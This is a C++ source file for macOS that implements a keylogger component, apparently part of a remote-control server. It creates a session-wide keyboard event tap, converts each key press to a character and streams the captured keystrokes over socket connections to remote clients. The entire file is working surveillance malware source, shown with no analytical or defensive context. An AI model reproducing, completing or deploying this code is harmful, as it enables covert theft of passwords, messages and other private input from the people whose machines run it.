#ifdef __APPLE__

#include "Keylog.h"
#include "../../Utils/MsgTransport.h"
#include "../../Message/Response.h"
#include <string>
#include <mutex>
#include <CoreFoundation/CoreFoundation.h>
#include <Carbon/Carbon.h>

std::set<int> keylogfds;
// only English character is count
UniChar createStringForKey(CGKeyCode keyCode)
{
    TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
    CFDataRef layoutData = (CFDataRef) TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
    const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);

    UInt32 keysDown = 0;
    UniChar chars[4];
    UniCharCount realLength;

    UCKeyTranslate(keyboardLayout,
                   keyCode,
                   kUCKeyActionDown,
                   0,
                   LMGetKbdType(),
                   kUCKeyTranslateNoDeadKeysBit,
                   &keysDown,
                   sizeof(chars) / sizeof(chars[0]),
                   &realLength,
                   chars);
    CFRelease(currentKeyboard);    

    return chars[0];
}
CGEventRef hookCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon)
{
    if ((type != kCGEventKeyDown))
        return event;
    CGKeyCode keycode= (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    char tmp = createStringForKey(keycode);
    std::string msg;
    msg.push_back(tmp);
    
    Response res(CMD_RESPONSE_STR, OK_CODE, msg.size() + 1, (void *)msg.c_str());
    
    std::mutex m;
    std::lock_guard l(m);
    for (int fd: keylogfds)
    {
        sendResponse(fd, res, 0);
    }
    return event;
};
void Keylogger::startKeylogHelper()
{
    CFMachPortRef eventTap;
    CGEventMask eventMask;
    CFRunLoopSourceRef runLoopSource;
    
    eventMask = ((1 << kCGEventKeyDown) | (1 << kCGEventKeyUp));
    eventTap = CGEventTapCreate(kCGSessionEventTap, 
                                kCGHeadInsertEventTap, 
                                kCGEventTapOptionDefault,
                                eventMask, 
                                hookCallback, 
                                NULL);
    if (!eventTap) {
        std::cerr << "Server: failed to create event tap\n";
        exit(1);
    }
    std::mutex m;
    m.lock();
    this->_event_loop = CFRunLoopGetCurrent();

    // Create a run loop source.
    runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    
    // Add to the current run loop.
    CFRunLoopAddSource(this->_event_loop, runLoopSource, kCFRunLoopDefaultMode);
    
    // Enable the event tap.
    CGEventTapEnable(eventTap, true);
    
    // Set it all running.
    m.unlock();
    CFRunLoopRun();
}
Keylogger::Keylogger()
{
    this->_keylogThread = std::thread(&Keylogger::startKeylogHelper, this);
}
Keylogger::~Keylogger()
{
    CFRunLoopStop(this->_event_loop);
    this->_keylogThread.join();
}

#endif